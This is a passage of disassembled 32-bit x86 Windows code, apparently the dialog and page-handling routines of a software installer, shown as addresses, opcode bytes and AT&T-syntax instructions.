  403a97:	a3 c4 b7 43 00       	mov    %eax,0x43b7c4
  403a9c:	8b 0d a4 91 40 00    	mov    0x4091a4,%ecx
  403aa2:	33 ed                	xor    %ebp,%ebp
  403aa4:	8b f1                	mov    %ecx,%esi
  403aa6:	c1 e6 06             	shl    $0x6,%esi
  403aa9:	03 35 80 1b 45 00    	add    0x451b80,%esi
  403aaf:	3b cd                	cmp    %ebp,%ecx
  403ab1:	7c 3e                	jl     0x403af1
  403ab3:	83 f8 01             	cmp    $0x1,%eax
  403ab6:	75 31                	jne    0x403ae9
  403ab8:	55                   	push   %ebp
  403ab9:	ff 76 10             	push   0x10(%esi)
  403abc:	e8 c8 d8 ff ff       	call   0x401389
  403ac1:	85 c0                	test   %eax,%eax
  403ac3:	74 24                	je     0x403ae9
  403ac5:	6a 01                	push   $0x1
  403ac7:	55                   	push   %ebp
  403ac8:	68 0f 04 00 00       	push   $0x40f
  403acd:	ff 35 38 db 44 00    	push   0x44db38
  403ad3:	ff 15 44 72 40 00    	call   *0x407244
  403ad9:	33 c0                	xor    %eax,%eax
  403adb:	39 2d 2c db 44 00    	cmp    %ebp,0x44db2c
  403ae1:	0f 94 c0             	sete   %al
  403ae4:	e9 a4 02 00 00       	jmp    0x403d8d
  403ae9:	39 2e                	cmp    %ebp,(%esi)
  403aeb:	0f 84 9a 02 00 00    	je     0x403d8b
  403af1:	68 0b 04 00 00       	push   $0x40b
  403af6:	e8 0f 03 00 00       	call   0x403e0a
  403afb:	a1 c4 b7 43 00       	mov    0x43b7c4,%eax
  403b00:	01 05 a4 91 40 00    	add    %eax,0x4091a4
  403b06:	c1 e0 06             	shl    $0x6,%eax
  403b09:	03 f0                	add    %eax,%esi
  403b0b:	a1 a4 91 40 00       	mov    0x4091a4,%eax
  403b10:	3b 05 84 1b 45 00    	cmp    0x451b84,%eax
  403b16:	75 07                	jne    0x403b1f
  403b18:	6a 01                	push   $0x1
  403b1a:	e8 ec d8 ff ff       	call   0x40140b
  403b1f:	39 2d 2c db 44 00    	cmp    %ebp,0x44db2c
  403b25:	0f 85 1e 02 00 00    	jne    0x403d49
  403b2b:	a1 84 1b 45 00       	mov    0x451b84,%eax
  403b30:	39 05 a4 91 40 00    	cmp    %eax,0x4091a4
  403b36:	0f 83 0d 02 00 00    	jae    0x403d49
  403b3c:	ff 76 24             	push   0x24(%esi)
  403b3f:	8b 5e 14             	mov    0x14(%esi),%ebx
  403b42:	68 00 e0 48 00       	push   $0x48e000
  403b47:	e8 e2 1e 00 00       	call   0x405a2e
  403b4c:	ff 76 20             	push   0x20(%esi)
  403b4f:	68 19 fc ff ff       	push   $0xfffffc19
  403b54:	57                   	push   %edi
  403b55:	e8 64 02 00 00       	call   0x403dbe
  403b5a:	ff 76 1c             	push   0x1c(%esi)
  403b5d:	68 1b fc ff ff       	push   $0xfffffc1b
  403b62:	57                   	push   %edi
  403b63:	e8 56 02 00 00       	call   0x403dbe
  403b68:	ff 76 28             	push   0x28(%esi)
  403b6b:	68 1a fc ff ff       	push   $0xfffffc1a
  403b70:	57                   	push   %edi
  403b71:	e8 48 02 00 00       	call   0x403dbe
  403b76:	6a 03                	push   $0x3
  403b78:	57                   	push   %edi
  403b79:	ff 15 2c 72 40 00    	call   *0x40722c
  403b7f:	39 2d ec 1b 45 00    	cmp    %ebp,0x451bec
  403b85:	89 44 24 2c          	mov    %eax,0x2c(%esp)
  403b89:	74 08                	je     0x403b93
  403b8b:	66 81 e3 fd fe       	and    $0xfefd,%bx
  403b90:	83 cb 04             	or     $0x4,%ebx
  403b93:	8b cb                	mov    %ebx,%ecx
  403b95:	83 e1 08             	and    $0x8,%ecx
  403b98:	51                   	push   %ecx
  403b99:	50                   	push   %eax
  403b9a:	ff 15 60 72 40 00    	call   *0x407260
  403ba0:	8b c3                	mov    %ebx,%eax
  403ba2:	25 00 01 00 00       	and    $0x100,%eax
  403ba7:	50                   	push   %eax
  403ba8:	ff 74 24 30          	push   0x30(%esp)
  403bac:	ff 15 3c 72 40 00    	call   *0x40723c
  403bb2:	8b c3                	mov    %ebx,%eax
  403bb4:	83 e0 02             	and    $0x2,%eax
  403bb7:	50                   	push   %eax
  403bb8:	e8 23 02 00 00       	call   0x403de0
  403bbd:	83 e3 04             	and    $0x4,%ebx
  403bc0:	53                   	push   %ebx
  403bc1:	ff 35 a0 37 43 00    	push   0x4337a0
  403bc7:	ff 15 3c 72 40 00    	call   *0x40723c
  403bcd:	3b dd                	cmp    %ebp,%ebx
  403bcf:	74 03                	je     0x403bd4
  403bd1:	55                   	push   %ebp
  403bd2:	eb 02                	jmp    0x403bd6
  403bd4:	6a 01                	push   $0x1
  403bd6:	68 60 f0 00 00       	push   $0xf060
  403bdb:	55                   	push   %ebp
  403bdc:	57                   	push   %edi
  403bdd:	ff 15 7c 71 40 00    	call   *0x40717c
  403be3:	50                   	push   %eax
  403be4:	ff 15 78 71 40 00    	call   *0x407178
  403bea:	8b 1d 44 72 40 00    	mov    0x407244,%ebx
  403bf0:	6a 01                	push   $0x1
  403bf2:	55                   	push   %ebp
  403bf3:	68 f4 00 00 00       	push   $0xf4
  403bf8:	ff 74 24 38          	push   0x38(%esp)
  403bfc:	ff d3                	call   *%ebx
  403bfe:	39 2d ec 1b 45 00    	cmp    %ebp,0x451bec
  403c04:	74 13                	je     0x403c19
  403c06:	55                   	push   %ebp
  403c07:	6a 02                	push   $0x2
  403c09:	68 01 04 00 00       	push   $0x401
  403c0e:	57                   	push   %edi
  403c0f:	ff d3                	call   *%ebx
  403c11:	ff 35 a0 37 43 00    	push   0x4337a0
  403c17:	eb 06                	jmp    0x403c1f
  403c19:	ff 35 d8 b7 43 00    	push   0x43b7d8
  403c1f:	e8 cf 01 00 00       	call   0x403df3
  403c24:	bb e0 b7 43 00       	mov    $0x43b7e0,%ebx
  403c29:	68 60 db 44 00       	push   $0x44db60
  403c2e:	53                   	push   %ebx
  403c2f:	e8 d8 1d 00 00       	call   0x405a0c
  403c34:	ff 76 18             	push   0x18(%esi)
  403c37:	53                   	push   %ebx
  403c38:	e8 e5 1d 00 00       	call   0x405a22
  403c3d:	03 c3                	add    %ebx,%eax
  403c3f:	50                   	push   %eax
  403c40:	e8 e9 1d 00 00       	call   0x405a2e
  403c45:	53                   	push   %ebx
  403c46:	57                   	push   %edi
  403c47:	ff 15 f4 71 40 00    	call   *0x4071f4
  403c4d:	55                   	push   %ebp
  403c4e:	ff 76 08             	push   0x8(%esi)
  403c51:	e8 33 d7 ff ff       	call   0x401389
  403c56:	85 c0                	test   %eax,%eax
  403c58:	0f 85 9d fe ff ff    	jne    0x403afb
  403c5e:	39 2e                	cmp    %ebp,(%esi)
  403c60:	0f 84 95 fe ff ff    	je     0x403afb
  403c66:	83 7e 04 05          	cmpl   $0x5,0x4(%esi)
  403c6a:	75 1d                	jne    0x403c89
  403c6c:	39 2d ec 1b 45 00    	cmp    %ebp,0x451bec
  403c72:	0f 85 13 01 00 00    	jne    0x403d8b
  403c78:	39 2d e0 1b 45 00    	cmp    %ebp,0x451be0
  403c7e:	0f 85 77 fe ff ff    	jne    0x403afb
  403c84:	e9 02 01 00 00       	jmp    0x403d8b
  403c89:	ff 35 38 db 44 00    	push   0x44db38
  403c8f:	ff 15 e8 71 40 00    	call   *0x4071e8
  403c95:	89 35 b0 77 43 00    	mov    %esi,0x4377b0
  403c9b:	39 2e                	cmp    %ebp,(%esi)
  403c9d:	0f 8e c5 00 00 00    	jle    0x403d68
  403ca3:	8b 46 04             	mov    0x4(%esi),%eax
  403ca6:	56                   	push   %esi
  403ca7:	ff 34 85 a8 91 40 00 	push   0x4091a8(,%eax,4)
  403cae:	66 8b 06             	mov    (%esi),%ax
  403cb1:	66 03 05 40 db 44 00 	add    0x44db40,%ax
  403cb8:	57                   	push   %edi
  403cb9:	0f b7 c0             	movzwl %ax,%eax
  403cbc:	50                   	push   %eax
  403cbd:	ff 35 60 1b 45 00    	push   0x451b60
  403cc3:	ff 15 ec 71 40 00    	call   *0x4071ec
  403cc9:	3b c5                	cmp    %ebp,%eax
  403ccb:	a3 38 db 44 00       	mov    %eax,0x44db38
  403cd0:	0f 84 92 00 00 00    	je     0x403d68
  403cd6:	ff 76 2c             	push   0x2c(%esi)
  403cd9:	6a 06                	push   $0x6
  403cdb:	50                   	push   %eax
  403cdc:	e8 dd 00 00 00       	call   0x403dbe
  403ce1:	8d 44 24 10          	lea    0x10(%esp),%eax
  403ce5:	50                   	push   %eax
  403ce6:	68 fa 03 00 00       	push   $0x3fa
  403ceb:	57                   	push   %edi
  403cec:	ff 15 2c 72 40 00    	call   *0x40722c
  403cf2:	50                   	push   %eax
  403cf3:	ff 15 74 71 40 00    	call   *0x407174
  403cf9:	8d 44 24 10          	lea    0x10(%esp),%eax
  403cfd:	50                   	push   %eax
  403cfe:	57                   	push   %edi
  403cff:	ff 15 70 71 40 00    	call   *0x407170
  403d05:	6a 15                	push   $0x15
  403d07:	55                   	push   %ebp
  403d08:	55                   	push   %ebp
  403d09:	ff 74 24 20          	push   0x20(%esp)
  403d0d:	ff 74 24 20          	push   0x20(%esp)
  403d11:	55                   	push   %ebp
  403d12:	ff 35 38 db 44 00    	push   0x44db38
  403d18:	ff 15 88 71 40 00    	call   *0x407188
  403d1e:	55                   	push   %ebp
  403d1f:	ff 76 0c             	push   0xc(%esi)
  403d22:	e8 62 d6 ff ff       	call   0x401389
  403d27:	39 2d 2c db 44 00    	cmp    %ebp,0x44db2c
  403d2d:	75 5c                	jne    0x403d8b
  403d2f:	6a 08                	push   $0x8
  403d31:	ff 35 38 db 44 00    	push   0x44db38
  403d37:	ff 15 60 72 40 00    	call   *0x407260
  403d3d:	68 05 04 00 00       	push   $0x405
  403d42:	e8 c3 00 00 00       	call   0x403e0a
  403d47:	eb 1f                	jmp    0x403d68
  403d49:	ff 35 38 db 44 00    	push   0x44db38
  403d4f:	ff 15 e8 71 40 00    	call   *0x4071e8
  403d55:	ff 35 a8 57 43 00    	push   0x4357a8
  403d5b:	89 2d 68 1b 45 00    	mov    %ebp,0x451b68
  403d61:	57                   	push   %edi
  403d62:	ff 15 6c 71 40 00    	call   *0x40716c
  403d68:	39 2d e0 37 44 00    	cmp    %ebp,0x4437e0
  403d6e:	75 1b                	jne    0x403d8b
  403d70:	39 2d 38 db 44 00    	cmp    %ebp,0x44db38
  403d76:	74 13                	je     0x403d8b
  403d78:	6a 0a                	push   $0xa
  403d7a:	57                   	push   %edi
  403d7b:	ff 15 60 72 40 00    	call   *0x407260
  403d81:	c7 05 e0 37 44 00 01 	movl   $0x1,0x4437e0
  403d88:	00 00 00 
  403d8b:	33 c0                	xor    %eax,%eax
  403d8d:	5f                   	pop    %edi
  403d8e:	5e                   	pop    %esi
  403d8f:	5d                   	pop    %ebp
  403d90:	5b                   	pop    %ebx
  403d91:	83 c4 10             	add    $0x10,%esp
  403d94:	c2 10 00             	ret    $0x10
  403d97:	83 7c 24 04 78       	cmpl   $0x78,0x4(%esp)
  403d9c:	75 06                	jne    0x403da4
  403d9e:	ff 05 2c db 44 00    	incl   0x44db2c
  403da4:	6a 00                	push   $0x0
  403da6:	ff 74 24 08          	push   0x8(%esp)
  403daa:	68 08 04 00 00       	push   $0x408
  403daf:	ff 35 68 1b 45 00    	push   0x451b68
  403db5:	ff 15 44 72 40 00    	call   *0x407244
  403dbb:	c2 04 00             	ret    $0x4
  403dbe:	ff 74 24 0c          	push   0xc(%esp)
  403dc2:	6a 00                	push   $0x0
  403dc4:	e8 65 1c 00 00       	call   0x405a2e
  403dc9:	50                   	push   %eax
  403dca:	8b 44 24 0c          	mov    0xc(%esp),%eax
  403dce:	05 e8 03 00 00       	add    $0x3e8,%eax
  403dd3:	50                   	push   %eax
  403dd4:	ff 74 24 0c          	push   0xc(%esp)
  403dd8:	e8 ce 14 00 00       	call   0x4052ab
  403ddd:	c2 0c 00             	ret    $0xc
  403de0:	ff 74 24 04          	push   0x4(%esp)
  403de4:	ff 35 d8 b7 43 00    	push   0x43b7d8
  403dea:	ff 15 3c 72 40 00    	call   *0x40723c
  403df0:	c2 04 00             	ret    $0x4
  403df3:	6a 01                	push   $0x1
  403df5:	ff 74 24 08          	push   0x8(%esp)
  403df9:	6a 28                	push   $0x28
  403dfb:	ff 35 68 1b 45 00    	push   0x451b68
  403e01:	ff 15 44 72 40 00    	call   *0x407244
  403e07:	c2 04 00             	ret    $0x4
  403e0a:	a1 38 db 44 00       	mov    0x44db38,%eax
  403e0f:	85 c0                	test   %eax,%eax
  403e11:	74 0f                	je     0x403e22
  403e13:	6a 00                	push   $0x0
  403e15:	6a 00                	push   $0x0
  403e17:	ff 74 24 0c          	push   0xc(%esp)
  403e1b:	50                   	push   %eax
  403e1c:	ff 15 44 72 40 00    	call   *0x407244
  403e22:	c2 04 00             	ret    $0x4
  403e25:	55                   	push   %ebp
  403e26:	8b ec                	mov    %esp,%ebp
  403e28:	83 ec 0c             	sub    $0xc,%esp
  403e2b:	8b 45 08             	mov    0x8(%ebp),%eax
  403e2e:	56                   	push   %esi
  403e2f:	05 cd fe ff ff       	add    $0xfffffecd,%eax
  403e34:	83 f8 05             	cmp    $0x5,%eax
  403e37:	0f 87 8e 00 00 00    	ja     0x403ecb
  403e3d:	6a eb                	push   $0xffffffeb
  403e3f:	ff 75 10             	push   0x10(%ebp)
  403e42:	ff 15 90 71 40 00    	call   *0x407190
  403e48:	8b f0                	mov    %eax,%esi
  403e4a:	85 f6                	test   %esi,%esi
  403e4c:	74 7d                	je     0x403ecb
  403e4e:	f6 46 14 02          	testb  $0x2,0x14(%esi)
  403e52:	8b 06                	mov    (%esi),%eax
  403e54:	57                   	push   %edi
  403e55:	8b 3d 8c 71 40 00    	mov    0x40718c,%edi
  403e5b:	74 03                	je     0x403e60
  403e5d:	50                   	push   %eax
  403e5e:	ff d7                	call   *%edi
  403e60:	f6 46 14 01          	testb  $0x1,0x14(%esi)
  403e64:	74 0a                	je     0x403e70
  403e66:	50                   	push   %eax
  403e67:	ff 75 0c             	push   0xc(%ebp)
  403e6a:	ff 15 54 70 40 00    	call   *0x407054
  403e70:	ff 76 10             	push   0x10(%esi)
  403e73:	ff 75 0c             	push   0xc(%ebp)
  403e76:	ff 15 50 70 40 00    	call   *0x407050
  403e7c:	8b 46 04             	mov    0x4(%esi),%eax
  403e7f:	f6 46 14 08          	testb  $0x8,0x14(%esi)
  403e83:	89 45 f8             	mov    %eax,-0x8(%ebp)
  403e86:	74 06                	je     0x403e8e
  403e88:	50                   	push   %eax
  403e89:	ff d7                	call   *%edi
  403e8b:	89 45 f8             	mov    %eax,-0x8(%ebp)
  403e8e:	f6 46 14 04          	testb  $0x4,0x14(%esi)
  403e92:	5f                   	pop    %edi
  403e93:	74 0a                	je     0x403e9f
  403e95:	50                   	push   %eax
  403e96:	ff 75 0c             	push   0xc(%ebp)
  403e99:	ff 15 3c 70 40 00    	call   *0x40703c
  403e9f:	f6 46 14 10          	testb  $0x10,0x14(%esi)
  403ea3:	74 21                	je     0x403ec6
  403ea5:	8b 46 08             	mov    0x8(%esi),%eax
  403ea8:	89 45 f4             	mov    %eax,-0xc(%ebp)
  403eab:	8b 46 0c             	mov    0xc(%esi),%eax
  403eae:	85 c0                	test   %eax,%eax
  403eb0:	74 07                	je     0x403eb9
  403eb2:	50                   	push   %eax
  403eb3:	ff 15 44 70 40 00    	call   *0x407044
  403eb9:	8d 45 f4             	lea    -0xc(%ebp),%eax
  403ebc:	50                   	push   %eax
  403ebd:	ff 15 48 70 40 00    	call   *0x407048
  403ec3:	89 46 0c             	mov    %eax,0xc(%esi)
  403ec6:	8b 46 0c             	mov    0xc(%esi),%eax
  403ec9:	eb 02                	jmp    0x403ecd
  403ecb:	33 c0                	xor    %eax,%eax
  403ecd:	5e                   	pop    %esi
  403ece:	c9                   	leave
  403ecf:	c2 0c 00             	ret    $0xc
  403ed2:	55                   	push   %ebp
  403ed3:	8b ec                	mov    %esp,%ebp
  403ed5:	8b 45 08             	mov    0x8(%ebp),%eax
  403ed8:	8b 0d a4 37 43 00    	mov    0x4337a4,%ecx
  403ede:	ff 75 10             	push   0x10(%ebp)
  403ee1:	03 c8                	add    %eax,%ecx
  403ee3:	51                   	push   %ecx
  403ee4:	ff 75 0c             	push   0xc(%ebp)
  403ee7:	ff 15 b8 70 40 00    	call   *0x4070b8
  403eed:	ff 75 0c             	push   0xc(%ebp)
  403ef0:	e8 2d 1b 00 00       	call   0x405a22
  403ef5:	8b 4d 14             	mov    0x14(%ebp),%ecx
  403ef8:	89 01                	mov    %eax,(%ecx)
  403efa:	01 05 a4 37 43 00    	add    %eax,0x4337a4
  403f00:	33 c0                	xor    %eax,%eax
  403f02:	5d                   	pop    %ebp
  403f03:	c2 10 00             	ret    $0x10
  403f06:	55                   	push   %ebp
  403f07:	8b ec                	mov    %esp,%ebp
  403f09:	83 ec 0c             	sub    $0xc,%esp
  403f0c:	81 7d 0c 10 01 00 00 	cmpl   $0x110,0xc(%ebp)
  403f13:	53                   	push   %ebx
  403f14:	56                   	push   %esi
  403f15:	57                   	push   %edi
  403f16:	0f 85 0d 01 00 00    	jne    0x404029
  403f1c:	8b 5d 14             	mov    0x14(%ebp),%ebx
  403f1f:	8b 7b 30             	mov    0x30(%ebx),%edi
  403f22:	85 ff                	test   %edi,%edi
  403f24:	7d 11                	jge    0x403f37
  403f26:	8b 0d 3c db 44 00    	mov    0x44db3c,%ecx
  403f2c:	8d 04 bd 04 00 00 00 	lea    0x4(,%edi,4),%eax
  403f33:	2b c8                	sub    %eax,%ecx
  403f35:	8b 39                	mov    (%ecx),%edi
  403f37:	a1 98 1b 45 00       	mov    0x451b98,%eax
  403f3c:	ff 73 34             	push   0x34(%ebx)
  403f3f:	03 f8                	add    %eax,%edi
  403f41:	6a 22                	push   $0x22
  403f43:	0f be 07             	movsbl (%edi),%eax
  403f46:	89 45 14             	mov    %eax,0x14(%ebp)
  403f49:	8b 43 14             	mov    0x14(%ebx),%eax
  403f4c:	ff 75 08             	push   0x8(%ebp)
  403f4f:	83 65 f8 00          	andl   $0x0,-0x8(%ebp)
  403f53:	8b f0                	mov    %eax,%esi
  403f55:	47                   	inc    %edi
  403f56:	f7 d6                	not    %esi
  403f58:	c1 ee 05             	shr    $0x5,%esi
  403f5b:	83 e6 01             	and    $0x1,%esi
  403f5e:	83 e0 01             	and    $0x1,%eax
  403f61:	89 7d f4             	mov    %edi,-0xc(%ebp)
  403f64:	c7 45 fc d2 3e 40 00 	movl   $0x403ed2,-0x4(%ebp)
  403f6b:	0b f0                	or     %eax,%esi
  403f6d:	e8 4c fe ff ff       	call   0x403dbe
  403f72:	ff 73 38             	push   0x38(%ebx)
  403f75:	6a 23                	push   $0x23
  403f77:	ff 75 08             	push   0x8(%ebp)
  403f7a:	e8 3f fe ff ff       	call   0x403dbe
  403f7f:	33 c0                	xor    %eax,%eax
  403f81:	6a 01                	push   $0x1
  403f83:	85 f6                	test   %esi,%esi
  403f85:	0f 94 c0             	sete   %al
  403f88:	05 0a 04 00 00       	add    $0x40a,%eax
  403f8d:	50                   	push   %eax
  403f8e:	ff 75 08             	push   0x8(%ebp)
  403f91:	ff 15 9c 71 40 00    	call   *0x40719c
  403f97:	56                   	push   %esi
  403f98:	e8 43 fe ff ff       	call   0x403de0
  403f9d:	68 e8 03 00 00       	push   $0x3e8
  403fa2:	ff 75 08             	push   0x8(%ebp)
  403fa5:	ff 15 2c 72 40 00    	call   *0x40722c
  403fab:	8b d8                	mov    %eax,%ebx
  403fad:	53                   	push   %ebx
  403fae:	e8 40 fe ff ff       	call   0x403df3
  403fb3:	8b 35 44 72 40 00    	mov    0x407244,%esi
  403fb9:	6a 00                	push   $0x0
  403fbb:	6a 01                	push   $0x1
  403fbd:	68 5b 04 00 00       	push   $0x45b
  403fc2:	53                   	push   %ebx
  403fc3:	ff d6                	call   *%esi
  403fc5:	a1 70 1b 45 00       	mov    0x451b70,%eax
  403fca:	8b 40 68             	mov    0x68(%eax),%eax
  403fcd:	85 c0                	test   %eax,%eax
  403fcf:	7d 09                	jge    0x403fda
  403fd1:	f7 d8                	neg    %eax
  403fd3:	50                   	push   %eax
  403fd4:	ff 15 8c 71 40 00    	call   *0x40718c
  403fda:	50                   	push   %eax
  403fdb:	6a 00                	push   $0x0
  403fdd:	68 43 04 00 00       	push   $0x443
  403fe2:	53                   	push   %ebx
  403fe3:	ff d6                	call   *%esi
  403fe5:	68 00 00 01 04       	push   $0x4010000
  403fea:	6a 00                	push   $0x0
  403fec:	68 45 04 00 00       	push   $0x445
  403ff1:	53                   	push   %ebx
  403ff2:	ff d6                	call   *%esi
  403ff4:	83 25 a4 37 43 00 00 	andl   $0x0,0x4337a4
  403ffb:	57                   	push   %edi
  403ffc:	e8 21 1a 00 00       	call   0x405a22
  404001:	50                   	push   %eax
  404002:	6a 00                	push   $0x0
  404004:	68 35 04 00 00       	push   $0x435
  404009:	53                   	push   %ebx
  40400a:	ff d6                	call   *%esi
  40400c:	8d 45 f4             	lea    -0xc(%ebp),%eax
  40400f:	50                   	push   %eax
  404010:	ff 75 14             	push   0x14(%ebp)
  404013:	68 49 04 00 00       	push   $0x449
  404018:	53                   	push   %ebx
  404019:	ff d6                	call   *%esi
  40401b:	83 25 c0 b7 43 00 00 	andl   $0x0,0x43b7c0
  404022:	33 c0                	xor    %eax,%eax
  404024:	e9 61 01 00 00       	jmp    0x40418a
  404029:	81 7d 0c 11 01 00 00 	cmpl   $0x111,0xc(%ebp)
  404030:	8b 1d 2c 72 40 00    	mov    0x40722c,%ebx
  404036:	8b 35 44 72 40 00    	mov    0x407244,%esi
  40403c:	75 5a                	jne    0x404098
  40403e:	8b 45 10             	mov    0x10(%ebp),%eax
  404041:	c1 e8 10             	shr    $0x10,%eax
  404044:	66 85 c0             	test   %ax,%ax
  404047:	0f 85 2e 01 00 00    	jne    0x40417b
  40404d:	33 c0                	xor    %eax,%eax
  40404f:	39 05 c0 b7 43 00    	cmp    %eax,0x43b7c0
  404055:	0f 85 20 01 00 00    	jne    0x40417b
  40405b:	8b 0d b0 77 43 00    	mov    0x4377b0,%ecx
  404061:	8d 79 14             	lea    0x14(%ecx),%edi
  404064:	f6 07 20             	testb  $0x20,(%edi)
  404067:	0f 84 0e 01 00 00    	je     0x40417b
  40406d:	50                   	push   %eax
  40406e:	50                   	push   %eax
  40406f:	68 f0 00 00 00       	push   $0xf0
  404074:	68 0a 04 00 00       	push   $0x40a
  404079:	ff 75 08             	push   0x8(%ebp)
  40407c:	ff d3                	call   *%ebx
  40407e:	50                   	push   %eax
  40407f:	ff d6                	call   *%esi
  404081:	8b 0f                	mov    (%edi),%ecx
  404083:	83 e0 01             	and    $0x1,%eax
  404086:	83 e1 fe             	and    $0xfffffffe,%ecx
  404089:	50                   	push   %eax
  40408a:	0b c8                	or     %eax,%ecx
  40408c:	89 0f                	mov    %ecx,(%edi)
  40408e:	e8 4d fd ff ff       	call   0x403de0
  404093:	e8 f9 00 00 00       	call   0x404191
  404098:	83 7d 0c 4e          	cmpl   $0x4e,0xc(%ebp)
  40409c:	0f 85 ca 00 00 00    	jne    0x40416c
  4040a2:	68 e8 03 00 00       	push   $0x3e8
  4040a7:	ff 75 08             	push   0x8(%ebp)
  4040aa:	ff d3                	call   *%ebx
  4040ac:	8b 7d 14             	mov    0x14(%ebp),%edi
  4040af:	81 7f 08 0b 07 00 00 	cmpl   $0x70b,0x8(%edi)
  4040b6:	75 72                	jne    0x40412a
  4040b8:	81 7f 0c 01 02 00 00 	cmpl   $0x201,0xc(%edi)
  4040bf:	75 69                	jne    0x40412a
  4040c1:	8b 4f 1c             	mov    0x1c(%edi),%ecx
  4040c4:	8b 57 18             	mov    0x18(%edi),%edx
  4040c7:	89 4d f8             	mov    %ecx,-0x8(%ebp)
  4040ca:	2b ca                	sub    %edx,%ecx
  4040cc:	81 f9 00 40 00 00    	cmp    $0x4000,%ecx
  4040d2:	89 55 f4             	mov    %edx,-0xc(%ebp)
  4040d5:	c7 45 fc 00 9b 44 00 	movl   $0x449b00,-0x4(%ebp)
  4040dc:	73 4c                	jae    0x40412a
  4040de:	8d 4d f4             	lea    -0xc(%ebp),%ecx
  4040e1:	51                   	push   %ecx
  4040e2:	6a 00                	push   $0x0
  4040e4:	68 4b 04 00 00       	push   $0x44b
  4040e9:	50                   	push   %eax
  4040ea:	ff d6                	call   *%esi
  4040ec:	8b 3d 98 71 40 00    	mov    0x407198,%edi
  4040f2:	68 02 7f 00 00       	push   $0x7f02
  4040f7:	6a 00                	push   $0x0
  4040f9:	ff d7                	call   *%edi
  4040fb:	8b 1d 94 71 40 00    	mov    0x407194,%ebx
  404101:	50                   	push   %eax
  404102:	ff d3                	call   *%ebx
  404104:	6a 01                	push   $0x1
  404106:	6a 00                	push   $0x0
  404108:	6a 00                	push   $0x0
  40410a:	ff 75 fc             	push   -0x4(%ebp)
  40410d:	68 c4 91 40 00       	push   $0x4091c4
  404112:	ff 75 08             	push   0x8(%ebp)
  404115:	ff 15 5c 71 40 00    	call   *0x40715c
  40411b:	68 00 7f 00 00       	push   $0x7f00
  404120:	6a 00                	push   $0x0
  404122:	ff d7                	call   *%edi
  404124:	50                   	push   %eax
  404125:	ff d3                	call   *%ebx
  404127:	8b 7d 14             	mov    0x14(%ebp),%edi
  40412a:	81 7f 08 00 07 00 00 	cmpl   $0x700,0x8(%edi)
  404131:	75 4b                	jne    0x40417e
  404133:	81 7f 0c 00 01 00 00 	cmpl   $0x100,0xc(%edi)
  40413a:	75 42                	jne    0x40417e
  40413c:	83 7f 10 0d          	cmpl   $0xd,0x10(%edi)
  404140:	75 11                	jne    0x404153
  404142:	6a 00                	push   $0x0
  404144:	6a 01                	push   $0x1
  404146:	68 11 01 00 00       	push   $0x111
  40414b:	ff 35 68 1b 45 00    	push   0x451b68
  404151:	ff d6                	call   *%esi
  404153:	83 7f 10 1b          	cmpl   $0x1b,0x10(%edi)
  404157:	75 0e                	jne    0x404167
  404159:	6a 00                	push   $0x0
  40415b:	6a 00                	push   $0x0
  40415d:	6a 10                	push   $0x10
  40415f:	ff 35 68 1b 45 00    	push   0x451b68
  404165:	ff d6                	call   *%esi
  404167:	33 c0                	xor    %eax,%eax
  404169:	40                   	inc    %eax
  40416a:	eb 1e                	jmp    0x40418a
  40416c:	81 7d 0c 0b 04 00 00 	cmpl   $0x40b,0xc(%ebp)
  404173:	75 06                	jne    0x40417b
  404175:	ff 05 c0 b7 43 00    	incl   0x43b7c0
  40417b:	8b 7d 14             	mov    0x14(%ebp),%edi
  40417e:	57                   	push   %edi
  40417f:	ff 75 10             	push   0x10(%ebp)
  404182:	ff 75 0c             	push   0xc(%ebp)
  404185:	e8 9b fc ff ff       	call   0x403e25
  40418a:	5f                   	pop    %edi
  40418b:	5e                   	pop    %esi
  40418c:	5b                   	pop    %ebx
  40418d:	c9                   	leave
  40418e:	c2 10 00             	ret    $0x10
  404191:	83 3d ec 1b 45 00 00 	cmpl   $0x0,0x451bec
  404198:	a1 a0 37 43 00       	mov    0x4337a0,%eax
  40419d:	75 05                	jne    0x4041a4
  40419f:	a1 d8 b7 43 00       	mov    0x43b7d8,%eax
  4041a4:	6a 01                	push   $0x1
  4041a6:	6a 01                	push   $0x1
  4041a8:	68 f4 00 00 00       	push   $0xf4
  4041ad:	50                   	push   %eax
  4041ae:	ff 15 44 72 40 00    	call   *0x407244
  4041b4:	c3                   	ret
  4041b5:	55                   	push   %ebp
  4041b6:	8b ec                	mov    %esp,%ebp
  4041b8:	81 7d 0c 10 01 00 00 	cmpl   $0x110,0xc(%ebp)
  4041bf:	56                   	push   %esi
  4041c0:	8b 75 14             	mov    0x14(%ebp),%esi
  4041c3:	75 26                	jne    0x4041eb
  4041c5:	ff 76 30             	push   0x30(%esi)
  4041c8:	6a 1d                	push   $0x1d
  4041ca:	ff 75 08             	push   0x8(%ebp)
  4041cd:	e8 ec fb ff ff       	call   0x403dbe
  4041d2:	8b 46 3c             	mov    0x3c(%esi),%eax
  4041d5:	c1 e0 0d             	shl    $0xd,%eax
  4041d8:	05 00 20 45 00       	add    $0x452000,%eax
  4041dd:	50                   	push   %eax
  4041de:	68 e8 03 00 00       	push   $0x3e8
  4041e3:	ff 75 08             	push   0x8(%ebp)
  4041e6:	e8 c0 10 00 00       	call   0x4052ab
  4041eb:	56                   	push   %esi
  4041ec:	ff 75 10             	push   0x10(%ebp)
  4041ef:	ff 75 0c             	push   0xc(%ebp)
  4041f2:	e8 2e fc ff ff       	call   0x403e25
  4041f7:	5e                   	pop    %esi
  4041f8:	5d                   	pop    %ebp
  4041f9:	c2 10 00             	ret    $0x10
  4041fc:	55                   	push   %ebp
  4041fd:	8b ec                	mov    %esp,%ebp
  4041ff:	83 ec 48             	sub    $0x48,%esp
  404202:	a1 b0 77 43 00       	mov    0x4377b0,%eax
  404207:	53                   	push   %ebx
  404208:	56                   	push   %esi
  404209:	89 45 e0             	mov    %eax,-0x20(%ebp)
  40420c:	8b 70 3c             	mov    0x3c(%eax),%esi
  40420f:	8b 40 38             	mov    0x38(%eax),%eax
  404212:	c1 e6 0d             	shl    $0xd,%esi
  404215:	81 c6 00 20 45 00    	add    $0x452000,%esi
  40421b:	81 7d 0c 0b 04 00 00 	cmpl   $0x40b,0xc(%ebp)
  404222:	57                   	push   %edi
  404223:	89 45 fc             	mov    %eax,-0x4(%ebp)
  404226:	bb fb 03 00 00       	mov    $0x3fb,%ebx
  40422b:	75 0d                	jne    0x40423a
  40422d:	56                   	push   %esi
  40422e:	53                   	push   %ebx
  40422f:	e8 7d 10 00 00       	call   0x4052b1
  404234:	56                   	push   %esi
  404235:	e8 34 1a 00 00       	call   0x405c6e
